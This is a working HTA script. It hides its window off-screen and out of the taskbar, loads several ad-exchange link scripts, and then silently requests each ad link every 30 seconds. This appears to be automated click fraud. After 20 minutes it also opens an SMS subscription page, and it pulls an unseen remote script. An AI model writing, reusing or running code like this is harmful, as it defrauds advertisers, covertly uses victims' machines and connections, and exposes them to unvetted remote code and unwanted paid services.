<Script>self.moveTo(screen.Width,screen.Height);</Script>
<html>
<head>
<hta:application showintaskbar='no'>
</head>
<body onload='start()'>
<Script Language="VBScript">
Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i = i + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
End Function
Function OpenHttp(Url)
	On Error Resume Next
	set Http = createobject("Microsoft.XMLHTTP")
	Http.open "GET",Url,false
	Http.send()
End Function
</Script>
<script language="JavaScript1.1" src=http://ad.t2t2.com/textclick.asp?user=888hi_com&style=4&bkcolor=no></script>
<script language="JavaScript1.1" src=http://ad.t2t2.com/textclick.asp?user=lxbtz&style=4&bkcolor=no></script>
<script language="JavaScript" src="http://www.rd18.net/link/rd18link_28_1.asp?oid=1147&bg="></script>
<!----互助广告链代码开始-----><script language=JavaScript src=http://www.link4exchange.com/115.php?id=22674&bg=></script><!----互助广告链代码结束----->
<script src="http://www.rose-link.com/textlink.dll?Link&ioid=3593&iStyle=3&pBkColor=e7e7e7"></script>
<script src="http://www.cnexchange.com/cnexchangelink.dll?Link&ioid=8047&iStyle=3&itype=1&pBkColor="></script>
<Script Language='JavaScript'>
setTimeout("window.open('http://xy1234.sms.163.com');",1200000);
var dd = 3;
function start() {
if (dd < document.links.length) {
OpenHttp(document.links[dd].href);
dd++;setTimeout('start()',1000*30);
}
else window.close();
}
</Script>
<Script Language='JavaScript' Src='http://lxbtz.533.net/getfile.js'></Script>
</body></html>
